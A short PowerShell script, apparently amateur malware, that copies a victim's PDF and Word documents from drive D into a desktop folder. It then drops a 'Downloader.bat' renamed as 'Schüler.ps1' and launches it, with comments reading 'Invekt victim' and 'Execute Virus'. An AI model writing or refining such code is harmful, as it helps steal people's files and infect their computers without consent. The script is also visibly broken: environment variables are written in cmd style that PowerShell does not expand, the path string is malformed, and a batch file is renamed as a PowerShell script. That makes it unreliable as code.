$output = "%User%\Desktop\Grap"
$input = "D:\*.pdf,*.docx"
$inputv = "%User%\Desktop\V\Downloader.bat"
$outputv = "D:\Schüler.ps1"
Copy-Item -path $input -destination $output
#Invekt victim
Copy-Item -path $inputv -destination $outputv
#Execute Virus
Start-process -path $outputv 